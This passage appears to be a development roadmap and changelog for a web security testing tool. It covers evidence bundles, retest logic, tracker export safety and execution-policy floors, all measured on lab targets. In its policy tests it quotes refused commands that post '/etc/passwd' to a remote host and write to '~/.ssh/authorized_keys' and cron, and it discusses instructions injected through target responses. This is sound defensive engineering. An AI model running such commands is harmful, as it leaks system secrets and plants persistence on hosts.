now run without Docker; the thirteenth is the end-to-end, because the unit cases take the
worker's report on trust and the lab is where that report is produced.

E-012 IS CLOSED.

### E-013: business-logic and concurrency testing

Extend the existing race-condition case with application-specific invariants:
single-use tokens, duplicate submissions, workflow ordering, and ownership transfer.
Use disposable lab objects and bounded concurrency; retain pre/post state and
cleanup evidence. No generic destructive checkout or real-payment automation.

Acceptance: detect one seeded invariant violation and reject a correctly enforced
control under the same bounded schedule. Confidence records timing variability
and does not infer impact from response counts alone.

### E-014: browser-backed confirmation

Add evidence-based confirmation recipes for existing XSS, CORS, cookie/session,
and authorization observations. For CORS, demonstrate that a browser in the
declared origin context can read the relevant protected response. For client-side
issues, preserve a trace and a narrowly defined assertion.

Do not impose a universal three-replay rule: use repeatability appropriate to the
check, and avoid repeating mutations without an explicit fixture lifecycle.
Scanner and model agreement alone never upgrades confidence to confirmed.

Acceptance: known false-positive fixtures stay unconfirmed; confirmed findings
include the exact assertion, identity, relevant response, and reproduction inputs.

### E-015: versioned methodology coverage

Build a coverage matrix linking implemented checks to versioned WSTG, API Security,
and selected ASVS requirements. ASVS is a verification requirements standard;
mapping scanner output to it does not establish full compliance. The official
ASVS repository provides versioned requirements and identifiers. [OWASP ASVS](https://github.com/OWASP/ASVS)

Acceptance: requirements appear as tested, not tested, not applicable, or manually
reviewed with a reason. Reports never label the application compliant because
automated checks returned no alerts.

## 7. R3: evidence, remediation, and retesting

### E-016: reproducible finding bundles

Package each finding with rule version, target/operation, authorization context,
evidence digests, relevant request/response pairs, tool/image version, and sanitized
reproduction instructions. Use secret placeholders resolved only at execution time.
Keep optional diagnostics separate from substantive evidence.

**Substantially started** (`8321ff0`, `aea0898`, `cce6bf6`, `6c9b0d9`). A finding
now carries the bytes it rests on, separately from the lane's own account of why
the claim was made, because one is lane-authored and the other is chosen by the
application under test. That distinction drove most of the work: the evidence
arrives redacted and bounded, cannot act as markup in a client's tracker, names
any character that would change what it displays, contains its own match rather
than the head of the response, and reaches report.json, the HTML report, SARIF, the
Jira CSV and the DefectDojo description. A time-based blind SQL injection exports
as its four requests with their payloads and measured durations.

**The image and tool version are on the finding now.** A reviewer handed one finding can say
what produced it without being handed the lane as well. The facts existed and were scattered
across three modules — ZAP's image in `runtime.IMAGES`, katana's `"version": "1.2.2"` and
Schemathesis's `"version": "4.0.14"` inlined in their own adapters' stage metadata — and none
reached the finding, the one thing that leaves the building.

`produced_by` is STAMPED FROM `source` by the model rather than passed at each construction
site. There are five sites and the failure mode is a sixth that forgets; filling in the first
five does not prevent that. Every site already declares `source`, so a new producer cannot be
silent, and `runtime.TOOL_VERSIONS` is the one place a version lives — the adapters read their
stage metadata from it, so provenance and metadata cannot drift apart. Lane-authored findings
(`cross-arm`, `testcase`) name no image on purpose: no container ran, so naming one would be
inventing it, and the provenance says what DOES reproduce them instead.

**The read-time digest check was already done** and this list was stale: `persistence.
evidence_bytes` has verified the recorded sha256 on every read since the increment that found
the digest was write-only state. Removed rather than left to be rediscovered.

**The bundle exists — CLOSED.** `integrations/bundle.py` assembles one finding into something
another person can check: the finding, the published assessment configuration, the
authorization context in the operator's own labels, the provenance (`produced_by`, the rule,
the methodology, and each stage's `schema_sha256`/`seed`), every cited artifact with its
content and digest, and the diagnostics kept SEPARATE from them.
`GET /sessions/{id}/findings/{fingerprint}/bundle` serves one; `write_bundle_archive` writes a
zip with a manifest digesting every member.

"An exported archive contains no credential values" is asserted over the SERIALISED bundle and
over the archive bytes, against a session whose identity carries a real-shaped bearer token and
cookie. It holds by construction rather than by filtering: `DECLARED_IDENTITY_FIELDS` names
what may travel — `name`, `role`, `tenant`, `subject_id`, `may_access` — and `headers`,
`cookies`, `storage_state` and `check` are simply not in it. The configuration is the PUBLISHED
row, never the secret store's private copy.

"A changed or missing artifact is detectable" holds because every artifact is read through
`evidence_bytes`, which re-checks the digest recorded at write time; a failure is reported in
`evidence_not_readable` and the summary says the claim rests on less than it says, rather than
the bundle quietly arriving smaller.

**Building it found a redaction defect that had been eating evidence.** `redact`'s
sensitive-header rule matched `[^\r\n]+` — everything to end of line — which is right in a
response capture and wrong in a shell command. Measured:

    curl -s -i -H "Authorization: $LOW_PRIV_TOKEN" http://app.test/api/Users/1

was stored as `curl -s -i -H "Authorization: [REDACTED]` — no closing quote, no URL, and the
placeholder NAME gone too, so a reviewer could not tell which credential to supply. The cookie
rule immediately above it had already learned this lesson for the same reason ("the rest of the
line is frequently the finding") and this rule never got the same treatment. It is one pass now
with a conditional group: quoted headers terminate on the quote they opened with, unquoted ones
still run to end of line, which is the shape a header disclosed in a response BODY has and the
reason the rule is not anchored.

A first attempt at that fix silently did nothing — a new quoted rule followed by the old
end-of-line rule, and the second re-matched the first's output. There is a test that the
sensitive-header value is matched by exactly one rule.

Acceptance: a reviewer can trace a finding to its supporting evidence and reproduce
a lab finding with replacement credentials. A changed or missing artifact is
detectable. An exported archive contains no credential values.

### E-017: assessment comparison and targeted retest

Add new, unchanged, changed, fixed, regressed, and not-retested states. Compare
stable fingerprints while considering schema, identity, rule, and scope changes.
Run the minimum relevant checks under the new explicit run policy.

Acceptance: a fixed lab vulnerability becomes fixed only after its verification
check succeeds; authentication failures, omitted endpoints, and partial scans
produce not-retested/unknown outcomes rather than automatic closure. **A probe that
received no bytes is not-retested, never fixed** — the 2026-09-10 run shows how
readily an empty response reads as a clean one.

**Done, and built around that one rule.** `inventory.compare_assessments`, served by
`GET /sessions/{id}/retest?baseline=…`, classifies every finding of an earlier assessment as
new, unchanged, changed, regressed, fixed or not_retested. Absence is never evidence. Three
things must hold before `fixed`:

1. the stage that produced the finding FINISHED in the retest, for that arm;
2. `coverage` says the retest reached the same (url, parameter, identity) pair — and where it
   did not, its own reason is quoted verbatim rather than summarised;
3. for a catalogue finding, the SAME case ran against that pair. `rule` is `<case>:<step>` and
   `coverage` records the case, so an XSS probe answering on a URL cannot close the SQL
   injection that was there.

`COVERAGE_STATES` supplies the sharper version of the warning and it is honoured: even
`answered` only means bytes came back, which is why condition 3 exists. The easiest way for a
live vulnerability to read as fixed is the endpoint quietly dropping out of the retest's crawl
— no coverage row at all — and that is `not_retested` with its own reason.

`configuration_differences` sits beside the states rather than below them: a retest against a
changed scope, schema, stage set or identity set can move a finding for a reason that is not a
fix, and a reader of the state column alone would never know.

**And the on-demand checks now record their own invocations**, which is what E-017 needed and
could not have. A cross-arm finding used to be unretestable in principle: nothing recorded that
a check RAN, so a retest that never invoked it was indistinguishable from one that invoked it
and found nothing. Inferring the invocation from findings — which
`_already_compared_the_other_way` does for its own purpose — only works when there ARE
findings, and the whole question is what an absence means.

`integration_check_runs` is written INSIDE each check rather than at its route, because both
are importable and are called directly by harnesses; a record only the routes wrote would be a
guard some callers opt into, which is the defect E-033 filed about the mutation refusal. A
refused run is recorded too, with its reasons, and excluded from the conclusive set — a
comparison that refused did not look.

Retesting a cross-arm finding then needs the same check, the same ordered pair, and a run that
did not refuse. The DIRECTION matters: privilege is an order, and a retest that compared the
arms the other way round asserts the opposite of the finding. `compared_with` supplies the
other half of the pair, and a finding without one is `not_retested` rather than closed on a
guess at which arm it meant.

**The marker never reaches the row.** It is the operator's description of privileged data, so
the function check stores the keyed `marker_digest` its findings already carry — see E-032's
per-path table for where the marker does and does not travel.

### E-018: remediation workflow and exports

Finish the existing DefectDojo mapping/reconciliation UX and add remediation
ownership, notes, and explicit export previews. Consider issue-tracker draft
exports after operators demonstrate a need. Keep external sending explicit.

Acceptance: repeated exports do not duplicate records, changed findings update the
same record, and uncertainty after a network failure is reconciled without blind
replay. Reports separate local triage from external synchronization status.

**A retest outcome can now reach the tracker, and the interesting part is what it refuses.**
E-017 produces the states and `defectdojo.finding_payload` maps `triage_state` to a remote
record; nothing connected them, so a verified fix stayed `open` until somebody clicked it and a
regression stayed `fixed`. `inventory.apply_retest`, served by
`POST /sessions/{id}/retest/apply`, is the bridge.

`RETEST_TRIAGE` holds exactly two entries — `fixed` closes, `regressed` reopens — and the
safety argument is that a state absent from the map cannot move a triage whatever a later
branch does. `not_retested` is absent and asserted absent: it means nobody looked, and closing
on it is the automatic closure E-017 exists to prevent.

It never overwrites `false_positive`. A human judged the finding not to be a bug; `fixed` would
replace that with a weaker claim and `regressed` would resurface noise somebody already
dismissed. Those findings are listed as left alone, with the reason, rather than silently
skipped.

It is a PREVIEW by default. This decides what a later export tells a client's tracker, so
"keep external sending explicit" applies one step earlier — at the thing that decides what gets
sent. `confirm` turns the report into a write, the two are asserted to agree, and applying
twice changes nothing the second time.

Every change records an artifact naming the retest, the state it established and the reason. A
finding that closed with no record of why is indistinguishable from one closed by hand, and
only one of those can be checked.

**Reports separate local triage from external synchronization status — done.** They are
different facts and the report conflated them by omission: it listed the findings whose
`triage_state` is `open` and said nothing else. So a reader saw a count of N with no way to
know that M more had been triaged away — the shape `coverage` exists to remove one layer down,
where a report listing only what remains reads as a clean bill of health for everything it
omits — and a finding triaged `fixed` looked dealt with while nothing said whether the client's
tracker had ever heard of it.

`report()` carries `triage` (counts by state, and how many are excluded from the list) and
`synchronization`, computed by `defectdojo.synchronization` from
`integration_remote_findings` — which records the payload digest at the moment of a successful
write, so recomputing it now says whether the tracker holds what erlik currently says. A local
triage change alone is enough to make a finding `changed_since_export`, which is exactly the
gap: triaging tells nobody.

UNRESOLVED EXPORTS MAKE ALL OF IT PROVISIONAL, and travel beside the per-finding states rather
than under them. `partial` is the steady-state DefectDojo deduplication case (E-032) and
`uncertain` means a write may or may not have landed; showing `synchronized` next to either
without saying so would assert the one thing nobody knows. A resolved export adds no caveat,
because a caveat on every report is a caveat nobody reads.

STILL OPEN in this entry: remediation ownership and notes, and explicit export previews.

### E-019: retention, backup, and operational diagnostics

Add configurable evidence retention, disk limits, secure deletion policy,
encrypted backups where appropriate, and a tested restore procedure. Define which
metadata survives evidence expiry. Expose scanner health, job ownership, redacted
diagnostics, stage latency, and budget consumption.

Acceptance: restore a historical run with valid evidence links; a disk-full event
causes an explicit incomplete outcome; telemetry cannot contain credentials or
captured response bodies by default. Retention never silently deletes evidence
needed by an active assessment.

**Retention exists, and the metadata question is answered.** `persistence.expire_evidence`
removes evidence BYTES past a retention age and keeps the row that describes them: id,
session, stage, kind, sha256, size and the date it went. That is what "define which metadata
survives evidence expiry" resolves to — enough for a later reader to know what was there and
that its digest was recorded.

**The defect it closes is that an expiry and a fault read identically.** `evidence_bytes`
raised one `EvidenceIntegrityError` for a missing artifact, so a store that LOST something and
a store that expired something on purpose were the same event to every reader — and they need
opposite responses: one is a fault to investigate, the other a decision somebody made.
`EvidenceExpired` is a SUBCLASS, so every existing handler keeps working and nothing starts
treating an expiry as readable, and `finding_bundle` files the two apart with the digest
retained for the expired one.

"Retention never silently deletes evidence needed by an active assessment" is the first rule
and is tested for each of `queued`, `running` and `needs_auth`. The active set is NOT the
complement of `FINISHED_STAGE_STATUSES`: `partial` and `failed` assessments are finished,
however unhappily, and holding their evidence for ever would be a different defect. Nothing is
removed without `confirm`, and one already-missing file does not leave the rest of the sweep
undone — the lesson `service.release` learned about collectors, applied to a filesystem.

WHAT IT DOES NOT CLAIM: it is not secure deletion. The bytes are unlinked, which returns them
to the filesystem and not to nobody; on a journalled or copy-on-write volume, or with a
snapshot behind it, they may persist. The entry asks for a secure deletion POLICY and this is a
retention mechanism — the summary says so rather than letting a reader assume otherwise.

**A disk-full event is an explicit incomplete outcome now, at both ends.**

At the front: `service.check_free_space`, called FIRST in `preflight`, refuses to start an
assessment on a volume below a floor (512 MiB, `ERLIK_MIN_FREE_BYTES`) and says how much is
free and what to change. Refusing up front is the most explicit outcome there is, and finding
out mid-run costs the containers, the operator's time and at worst a finding whose evidence
could not be written. It does not promise the run fits — nothing can, since evidence size
depends on the target — and says so.

At the back: `persist_result` verifies that a finding's `evidence_ids` name rows that exist.
`evidence` writes the FILE before the ROW, so a failed write leaves neither and a caller never
gets an id for bytes that are not there — the safe order. What was missing was the check one
level up: nothing verified the citations, so a finding whose proof was never stored persisted
exactly like one whose proof was. A `completed` stage carrying such a finding becomes `partial`
with a named reason and a `finding_evidence_not_stored` observation; a stage that already says
something more specific keeps its own word.

THE FINDING IS KEPT. The detection is not what failed, and dropping it would turn a storage
fault into a lost vulnerability — much the worse of the two errors. And an EXPIRED citation is
not this: retention keeps the row and removes only the bytes, so it still resolves here and
`evidence_bytes` reports the expiry. Asserted, so the two do not collapse into each other from
either side.

An unusable `ERLIK_MIN_FREE_BYTES` does not silently become no floor; a negative one is read
as the operator explicitly disabling it.

STILL OPEN in this entry: encrypted backups and a tested restore procedure, and the
operational telemetry (scanner health, job ownership, stage latency, budget consumption).

## 8. R4: bounded AI investigation

### E-020: consolidate execution and audit policy

Refactor the existing agent flow in `main.py` — **9,468 lines** — into smaller
services without changing historical report contracts. Align the legacy tool path,
deterministic runner, browser journeys, and integration adapters behind typed
requests and the same scope/budget decisions. Do not assume the new integration
proxy already governs every historical execution path.

Acceptance: each execution path passes the same refusal, cancellation, credential,
and audit tests. Unsupported tools fail explicitly. Policy decisions are visible
in the action log and are not delegated to the model.

**The refusal half of that acceptance is now a test, which is the measurement that would make
the refactor safe.** `tests/test_every_execution_path_refuses_the_same_things.py` drives the
same probes down both paths that run a catalogue command and asserts no path is more
permissive than another. It is deliberately NOT a claim that the paths are identical — the
integration lane is stricter in several places by design, and a floor is a minimum rather than
a maximum.

Measured before this increment, six probes: the two paths agreed on five and diverged on one.
`curl -d @/etc/passwd https://target/` reads a file from the ORCHESTRATOR — the host that also
holds the secret store, other engagements' evidence and the operator's own credentials — and
posts it to a client's server. The integration lane refused it in `curl_request`; the legacy
lane sent it. `http-local-file-read` is the floor that closes it, and it reaches every path
because it is a safe-mode rule: `execute_tool` applies it, and so does the runner's floor from
E-033.

**THE FIRST VERSION OF THE RULE WAS WRONG, and the historical command corpus caught it.**
Refusing `-d @file` outright broke this, from a real recorded run:

    echo '{"email":…,"password":…}' > /tmp/login.json && curl -X POST … -d @/tmp/login.json

That is the agent lane's ordinary way of posting a JSON body without fighting shell quoting,
and the file is one the same command line created from content it chose — not a read of
anything that was on the machine beforehand. The rule now exempts a file the command itself
wrote, and `test_historical_commands_denied_set_is_exactly_known` is what will catch the next
version that over-reaches.

WHAT IT DOES NOT STOP: a write in one command and a read in another. No rule that sees one
command line can, and this one does not pretend to — there is a test asserting the limit. It
stops the direct shape, which is the one an instruction injected through a target's response
would produce.

**A tool may now write only where erlik is allowed to write** — the complement of the read
side. A command can put bytes on the ORCHESTRATOR as easily as take them off it: `curl -o
~/.ssh/authorized_keys`, `nmap -oN /etc/cron.d/x`, `... > ~/.erlik/secrets/a.json`. That host
holds the secret store, other engagements' evidence and the operator's own files.

NOT A SAFE-MODE RULE, and that is the load-bearing decision. Safe mode answers "does this
engagement authorise destructive testing OF THE TARGET", and `ERLIK_SAFE_MODE=0` says yes.
Writing to the operator's disk is a different authorisation, so collapsing them would mean an
authorised destructive engagement silently unlocked the filesystem. The floor holds either
way, and there is a test that says so.

THE ROOTS COME FROM WHAT REAL RUNS DO. Measured over 1630 recorded commands: 14 (0.9%) write
anything, and every target is under /tmp or a bare relative name landing in the working
directory. Those two plus the data directory are the roots; `ERLIK_WRITE_ROOTS` extends them.
`curl -O` is refused outright because the TARGET names the file, and no recorded command uses
it.

**The rule was wrong three times and each corpus caught a different one.** A case-insensitive
flag match read every `-d` (curl's data) as `-D` (its dump-header) and called 17.9% of commands
writers. `-w` was included as "write-out" when it is a WORDLIST for ffuf, gobuster and hydra
and a stdout FORMAT STRING for curl. And `-o /dev/null` — the standard way to discard a body
while keeping headers, used by five steps of the shipped `WSTG-CLNT-04` — was refused until the
catalogue sweep found it. The recorded corpus covers the agent lane and the catalogue sweep
covers the deterministic one; both are now tests.

The idea came from reading xalgorix's `Path_Policy`, which confines writes to its data
directory, `~/.xalgorix/` and `/tmp` and counts the rejections. This is a reimplementation from
that documented behaviour rather than a port — they are Go and Apache-2.0, erlik is Python and
MIT, so nothing was copied and no attribution obligation attaches. Their rejection COUNTER is a
separate idea and is not done here; it belongs with E-019's telemetry.

**"Policy decisions are visible in the action log" — done for the integration lane.** The proxy
already records a decision for EVERY request with the reason it used, refusals included.
`record()` read two things out of that file and neither was the one an operator needs:

    request_count     every DECISION, allowed or refused
    blocked_requests  a bare count, no reasons

`request_count` is the number the BUDGET is accounted against — `budget_refusal` counts a
refused request too — so it is right for that and reads like activity for everything else. A
stage where all 47 requests were refused reported the same `request_count` as a stage where all
47 succeeded, and the number that means COVERAGE had to be derived by subtraction. It is
`requests_allowed` now.

A BARE COUNT INVITES THE WRONG CONCLUSION IN BOTH DIRECTIONS. Forty-seven refusals is
unremarkable when they are out-of-scope links a crawler followed and is a misconfiguration when
they are "operation not selected" — different repairs, and the count alone cannot tell them
apart. `blocked_by_reason` is the breakdown the proxy had already written and nothing read.

AND A STAGE THAT REACHED NOTHING IS NOT A CLEAN STAGE. A scanner whose every request was
refused can still exit 0 and be recorded `completed` with no findings, which is exactly what a
target with nothing wrong with it looks like. That is now `failed`, with the dominant reason
first, because what the operator repairs depends on which refusal it was. One request getting
through is NOT nothing and is left alone, and a stage that issued no requests at all is a
different situation this clause says nothing about — both asserted.

STILL OPEN in this entry: the refactor itself, and the cancellation/credential/audit halves of
the acceptance. The legacy lane's own refusals — safe mode, write confinement,
`http-local-file-read` — are recorded per step rather than in a request log, because they stop
the command before any request exists; whether that is the same visibility is not yet
measured.

### E-021: structured hypotheses and evidence review

Extend existing technique selection, target memory, and verification helpers.
Have the model propose a hypothesis with supporting evidence IDs, a bounded next
check, prerequisites, expected signal, and stopping condition. A deterministic
policy layer validates every proposed action.

Treat scanner output, target content, and retrieved technique text as untrusted
input. Separate a proposed investigation from an authorized execution. Store model
and prompt versions, selected references, rationale, and token/action/time usage.

Acceptance: injected instructions in a target response cannot expand scope, access
credentials, or launch an unselected mutation. Missing model availability leaves
deterministic results usable. Rejected hypotheses remain audit entries, not findings.

### E-022: prove AI adds value

Compare deterministic-only and deterministic-plus-AI arms on the same fixed labs,
scopes, identities, schemas, and total budgets. Use multiple runs for stochastic
components. Keep a held-out fixture set separate from the cases used to tune prompts
or technique retrieval; split by vulnerability implementation, not just URL.

Acceptance: publish incremental verified findings, false positives, cost, requests,
and duration. Adopt AI behavior only when measured benefit justifies overhead.
Do not automatically train or persist raw client evidence into shared memory.

## 9. R5: optional integrations and later platform work

These are candidates, not commitments. Confirm operator demand before implementation.

| Candidate | What it adds | Boundary and acceptance | Priority |
|---|---|---|---|
| OpenAPI + HAR / recorded request import | Better inventory when crawling misses authenticated operations | Validate input, redact secrets, preserve origin/identity, never replay state changes by default | High, alongside R1/R2 |
| Semgrep result import | Link source findings to routes and runtime evidence when source is supplied | Begin with JSON/SARIF ingestion; source findings remain unverified runtime hypotheses | Medium |
| Trivy artifact/image analysis | Dependency and image context for supplied deployment artifacts | Scan only supplied artifacts; package presence is not proof of reachable exploitation | Medium |
| Gitleaks repository analysis | Find exposed credential material in authorized supplied source/history | Store redacted locations; do not try discovered credentials against services automatically | Medium |
| Existing NVD enrichment improvements | Better prioritization with cached, timestamped vulnerability metadata | Preserve source/version-match uncertainty; no automatic severity based only on a banner | Medium |
| Issue tracker / SARIF automation | Put reviewed findings into engineering workflows | Stable IDs, explicit sending, preview and repeat-export tests | After R3 |
| Browser proxy session import | Reuse operator-captured testing sessions | Import bounded, redacted artifacts first; live proxy control is a separate execution-policy review | Later |
| WebSocket-specific testing | Coverage for real-time application protocols | Requires a new enforceable transport policy and protocol fixtures; unsupported in current HTTP-only boundary | Later, demand-driven |
| Cloud/Kubernetes assessment | Broader infrastructure coverage | Separate threat model, credentials, scope types, adapters, and fixtures; do not graft it onto web host scope | Separate product decision |

Semgrep documents machine-readable JSON and SARIF output suitable for an ingestion
adapter. [Semgrep output reference](https://docs.semgrep.dev/semgrep-appsec-platform/json-and-sarif/)
Trivy documents container-image analysis as an artifact-oriented input surface.
[Trivy image documentation](https://trivy.dev/docs/latest/target/container_image/)
Gitleaks supports secret detection in repositories and other supplied inputs.
[Gitleaks project](https://github.com/gitleaks/gitleaks)

Select one source/artifact integration first, measure incremental value on a fixed
lab, then decide whether the next is worth maintaining. Review binary and rule-set
licenses separately, pin tested versions/digests, and account for update maintenance.

Before adding a sixth discovery source, note where the 2026-09-10 measurement put
the bottleneck: the lane found 136 endpoints on a target and four parameters, and
missed a reachable error-based SQL injection because the injectable call is an XHR
rather than a link — while the string naming it sat in a JavaScript bundle the lane
had already fetched and recorded as an endpoint. Extracting operations from bodies
already in evidence is cheaper than another crawler, and is the same work as E-007.

### E-023: multi-user operation — only after the single-operator release

Add engagement ownership, roles, separate project secrets, audit identity, and
access checks for every evidence/API/WebSocket route before sharing the app between
operators. Test cross-project isolation directly. Replace the shared operator token
with an appropriate account/session model while retaining a documented local mode.

### E-024: distributed workers — only after measured capacity pressure

Introduce a durable queue, worker leases, heartbeat/reconciliation, and explicit
job ownership only if one host cannot meet measured needs. Move to PostgreSQL and
object storage when concurrency and retention justify them, not preemptively.
Design delivery as at-least-once: side-effecting scan stages must not be blindly
retried after lease loss. A remotely lost worker means interrupted/unknown until
its execution has been accounted for.

### E-025: an uncertain export could block a destination never written to — CLOSED

`export()` marked the row `uncertain` from a blanket
`except (Exception, CancelledError)`, which fires for failures raised before a single
byte leaves the machine — the sandbox not starting because Docker is down, a cancelled
run, a connection reset during the inventory read. An uncertain row blocks its
destination, and reconciliation cannot clear one with no remote write to verify
against: it answers `Remote state differs from intended export` for ever. So every
later export to that destination was a permanent no-op, and an operator whose Docker
daemon hiccuped was locked out of exporting that assessment with no way back.

`wrote` already drew the distinction, and the `RemoteError` branch directly above
already consulted it — only this branch hardcoded uncertainty. The premise was checked
rather than assumed: `wrote = True` is set immediately before each of the two write
requests (the import POST and a finding PATCH), and the only requests that can precede
it are the inventory GETs, which are reads. So "nothing was sent" is knowable, and
`failed` is the honest status — with `Failed before any request was issued; nothing was
written and this destination is not blocked`, so the operator knows to retry.

Pinned from both sides, because widening the `failed` branch too far would be worse
than the original defect: a local failure before any request is `failed` and retryable;
a cancellation *during* a write is still `uncertain` and still blocks; a read that fails
locally is `failed`, which is the test that holds the premise about `wrote`.

One existing test had to be rewritten, and it was mis-scoped rather than merely stale.
`test_defectdojo_uncertain_write_is_not_retried` set up a sandbox that failed to open —
which sends nothing at all — so its name and its scenario disagreed. It now makes the
write leave and then kills the connection, which is what the name describes, with a
sibling covering the other half.

### E-026: the uncertainty block missed the case it existed for — CLOSED

The block matched an export by DESTINATION, or by REMOTE TEST ID on that server. A
first `import` whose response was lost — a 202, a timeout, a cancellation — never
learns a test ID, so its row carries `remote_test_id = NULL`, `remote_test_id = ?`
cannot match, and only a repeat of the byte-identical body was blocked. An operator who
did what the documentation advises — find the test in the DefectDojo UI, then reimport
into it by ID — sailed past the guard and wrote a changed report over a write nobody had
established. That is the exact papering-over the guard prevents, in the exact scenario
it was written for.

A third clause now blocks on an unresolved export **for this session, to this server,
whose destination is not yet known**. Narrow on three counts, because my own note
warned that a wider block would lock out more operators rather than fewer: scoped to
the session that made it, scoped to the server, and lifting the moment the row is
resolved, since reconciling fills in the test ID it verified. Tests cover all three
boundaries — the block does not reach another server, it lifts after reconciliation,
and a `failed` export does not trigger it.

**The two were only safe to fix together, and in this order.** Widening the block while
every local failure still produced an `uncertain` row would have locked out exactly the
operators E-025 freed: one Docker hiccup would have blocked the whole server for that
session instead of one destination hash. The note recording E-026 said so, and it was
right.

### E-027: the shipped AUTHZ-04 check reported findings on clean endpoints — CLOSED

Its verdict was a body-hash differential: normalise three responses, strip 32-hex
and whitespace, and conclude `low == high` is an IDOR. That fires on anything two
identities legitimately see the same, which on a real API is a large class.

**Measured before and after**, over 3 seeded violations and 11 negative controls on
Juice Shop v17.1.1 — the second figure from the rewritten case driven through the
real `run_test_case`, not a reimplementation of its logic:

    the shipped body hash          5 false positives, 0 false negatives
    the rewritten case             0 false positives, 0 false negatives
    the rewritten case, anonymous
      clause removed               3 false positives, 0 false negatives

The five it reported on clean endpoints:

    GET /rest/basket/99999        200 {"data":null} to both     — absent object
    GET /api/Users/99999          404 Not Found to both         — absent object
    GET /rest/basket/2            the low identity's OWN basket — expected access
    GET /rest/products/1/reviews  public, identical to everyone — published content
    GET /api/Addresss/1           400 "Malicious activity" to both

The last is the sharpest, and it is the one reading the code would not predict: a
hash comparison cannot tell **"both identities were refused"** from "both identities
got the object", because both are `low == high`. Two identical denials were reported
as a shared secret.

**The verdict is now the typed `idor` evaluator**, which had existed, unwired, since
it was written. It asks a different question: did the privileged object — named by a
marker the OPERATOR supplies — reach the low-privilege arm while not reaching an
anonymous one? The asymmetry is the safety property, the same one the `ownership`
evaluator rests on: the marker is ours and the responses are the target's, so a
target can cost itself a finding and cannot manufacture one.

> That last sentence was too strong, and E-032 records the measurement that refutes it.
> The marker is the operator's, but the URL can be too: with the marker in the request
> — `/rest/track-order/99999`, or a query DVWA reflects — an endpoint that echoes input
> and requires a session satisfied every clause here, and the target WAS supplying the
> evidence for its own verdict. The reflection clause `cross_arm_privileged_function`
> already applied as its clause 0 is ported here now, and the marker is matched against
> the response BODY rather than the whole capture. The asymmetry holds only with both.

The evaluator was missing the anonymous arm entirely, which the ablation above shows
is worth three of the five. A case that declares no `anonymous_step` keeps the old
behaviour, so the clause is additive; a case that declares one whose step is missing
gets no finding, because a clause nobody ran is not a clause that passed.

**Three gates had to be reconciled, and they are not the same gate.** `private_object_marker`
was absent from `declared.DECLARABLE`, so nothing could supply it — and
`looks_injectable` refuses `"`, so every marker that identifies an object in a JSON
API (`"UserId":1`, `"email":"admin@juice-sh.op"`) would have been refused even once
listed. That rule exists because a declared value is **rendered into a command**,
where a quote closes an argument. A marker is compared in Python as a substring and
reaches no command line, so it is now held to the rule that does apply: bounded
length, no control characters. `declared.EVALUATOR_ONLY` is the single list, consulted
by both `declared.validate` and the sweep's own gate so the two cannot drift, and a
catalogue-wide test asserts the premise — that no step interpolates the field —
rather than assuming it.

The third gate was left alone deliberately, and then tightened. `_harvest` applies
`looks_injectable` to values lifted out of a TARGET'S OWN OUTPUT, and that must stay:
a marker the target chose is a finding the target chose. `Evaluator.produces` now
**refuses** an evaluator-only field outright, so the forgery is structurally
impossible rather than left to whoever writes the next case.

**What the rewrite does not do.** The case is still not runnable in the assessment
lane: its `required_any` credential alternatives are something the lane has nothing
to choose between (see `inventory.LANE_TARGET_FIELDS`), and the fetches are still
`bash -c` because a conditional `${HT:+-H ...}` is what lets one command carry either
a bearer token or a cookie. Making it lane-runnable needs per-role credential
plumbing the lane does not have, and is not what a precision fix is for. It runs in
the sweep and the CLI, where it previously produced five false positives.

Supplying credentials alone no longer makes the case run — the operator must also
name the private object, and the skip says so. That is the contract change: the old
verdict needed no operator input, and needing none is where the false positives came
from.

The 0-and-0 above is on Juice Shop, which keeps no application state in a cookie. On
DVWA the rewritten case was still wrong until E-028 was fixed with it, because there
the security level travels in the cookie and the control arm was running against a
different application. The two were entangled, and closing one without the other
would have left a measured false positive in place.

### E-028: the control arm ran at a different application configuration — CLOSED

The same defect as the 2026-09-10 arm divergence, inside the case meant to be the
control. A differential is only about identity if identity is the only thing that
varies, and AUTHZ-04's anonymous arm was `curl -s "$U"` carrying nothing at all —
while on DVWA the application's SECURITY LEVEL travels in a cookie, with
`dvwaSecurityLevelGet` falling back to `impossible` when it is absent. So "anonymous"
was not the authenticated arms' application with nobody logged in. It was a
different, hardened application with nobody logged in.

Measured on `/vulnerabilities/authbypass/get_user_data.php`:

    admin (high), security=low      273 bytes — the full user table
    gordonb (low), security=low     273 bytes — the full user table
    anonymous WITH security=low     273 bytes — the full user table
    anonymous, NO cookie             41 bytes — {"result":"fail","error":"Access denied"}

The endpoint has no access control at that level, so the honest verdict is "public,
not an identity boundary" — and with a bare anonymous arm the marker was absent from
it for the wrong reason, every clause passed, and the case reported HIGH on data DVWA
hands to anyone who asks.

`config_cookie` is the fix: a non-secret, operator-declared cookie carried by EVERY
arm including the anonymous one. curl merges multiple `-b` options (`-b "a=1" -b
"b=2"` sends `a=1;b=2` — verified), so it rides alongside an identity cookie instead
of replacing it, and `${CC:+-b "$CC"}` expands to nothing for an application that
needs none, which is why Juice Shop is unaffected.

Measured through the real runner, all four arrangements, every arm returning real
bytes:

    security=low,        anonymous arm CONFIGURED   no finding   correct (public here)
    security=low,        anonymous arm bare (old)   FINDING      FALSE POSITIVE
    security=impossible, anonymous arm CONFIGURED   no finding   correct (enforced)
    security=impossible, anonymous arm bare (old)   no finding   correct (enforced)

The distinction this introduces is worth more than the one case. Identity material is
per-arm and secret; configuration material is shared by every arm and is not. They
were the same field, and a differential cannot be one variable while they are.

### E-029: an identity with plain cookies got no form discovery at all — CLOSED

`adapters.py` gated the entire browser pass — the only producer of `source="form"`
and `source="playwright"` endpoints — on
`ctx.config.headless or (ctx.identity or {}).get("storage_state")`, while the proxy
injects `identity.headers`, `identity.cookies` AND `storage_state.cookies` on every
in-scope request. So an identity authenticated by plain cookies was fully
authenticated and discovered nothing.

**The premise had to be measured first**, because the browser context is created
with `storage_state=None` for such an identity — Chromium itself holds no cookies,
and only the proxy makes the requests authenticated. If that were not enough, the
fix would have enabled a pass that renders LOGGED-OUT pages while labelling the
endpoints with an authenticated identity, which is worse than not running it.
Measured against real DVWA, real worker image, real proxy, `storage_state=None` in
both arms and only the identity differing:

    anonymous             1342 bytes (the login page)   1 link    1 form
    cookie-only identity  6436 bytes                   31 links  13 forms

and the 13 are DVWA's own module forms. So proxy-injected cookies do authenticate
the rendered pass; it simply was not being run.

**The decision is now asked of the ASSESSMENT, not the arm** —
`adapters.wants_rendered_pass(config)`, which takes the config alone and therefore
cannot branch on an identity. The obvious repair ("run it when THIS identity carries
